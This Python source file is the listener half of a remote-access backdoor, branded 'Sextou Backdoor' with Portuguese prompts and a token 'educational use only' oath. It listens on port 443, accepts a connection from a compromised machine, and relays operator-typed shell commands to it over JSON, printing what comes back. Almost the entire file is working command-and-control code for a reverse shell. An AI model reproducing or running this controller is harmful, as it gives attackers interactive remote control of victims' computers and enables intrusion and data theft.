import os
import socket
import json
from itertools import chain, repeat
import sys

bufferSz = 1024

class Listener:
    def __init__(self, host, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host, port))
        os.system("clear")
        print ("")
        print ("   _____           _                ____             _       _                   ")
        print ("  / ____|         | |              |  _ \           | |     | |                  ")
        print (" | (___   _____  _| |_ ___  _   _  | |_) | __ _  ___| | ____| | ___   ___  _ __  ")
        print ("  \___ \ / _ \ \/ / __/ _ \| | | | |  _ < / _` |/ __| |/ / _` |/ _ \ / _ \| '__| ")
        print ("  ____) |  __/>  <| || (_) | |_| | | |_) | (_| | (__|   < (_| | (_) | (_) | |    ")
        print (" |_____/ \___/_/\_ \__\___/ \__,_| |____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|    ")
        print ("")                        
        print ("") 
        print ("") 
        print ("[!] Digite seu juramento abaixo: Usarei somente para uso educacional!")
        
        frase = {'Usarei somente para uso educacional!'}
        prompts = chain(["[+] Começe a digitar: "], repeat("[!] Não sabe escrever? Tente novamente: ", 1))
        replies = map(input, prompts)
        lowercased_replies = map(str.lower, replies)
        stripped_replies = map(str.strip, lowercased_replies)
        valid_response = next(filter(frase.__contains__, replies), None)
        
        if valid_response == None:
            print("[!] Resposta errada parceiro, Tchau!")
            print("")
            sys.exit()
            
        print('[!] Avante guerreiro!')
        print("[!] Aguardando conexão...")
        print ("") 
        s.listen(0)
        self.conn, adr = s.accept()
        print("[!] Aiô, Silver! Conexão remota recebida!") 
        print("[!] IP:",adr[0],"Porta:",str(adr[1]))
        print ("") 

    def exCmdRmt(self, cmd):
        # self.conn.send(cmd.encode())
        # return str(self.conn.recv(bufferSz), "utf-8")
        self.json_send(cmd)
        if cmd == "exit":
            self.conn.close()
            exit()
        return self.json_resc()
    
    def json_send(self, data):
        json_data = json.dumps(data)
        self.conn.send(json_data.encode())
    
    def json_resc(self):
        json_data = ""
        while True:
            try:
                json_data += self.conn.recv(bufferSz).decode("utf-8")
                return json.loads(json_data)
            except ValueError:
                continue

    
    def run(self):
        while True:
            cmd = input("[$] ")
            reply = self.exCmdRmt(cmd)
            print(reply)


def main():
    host = "0.0.0.0"
    port = 443
    listInst = Listener(host, port)
    listInst.run()


if __name__ == "__main__":
    main()
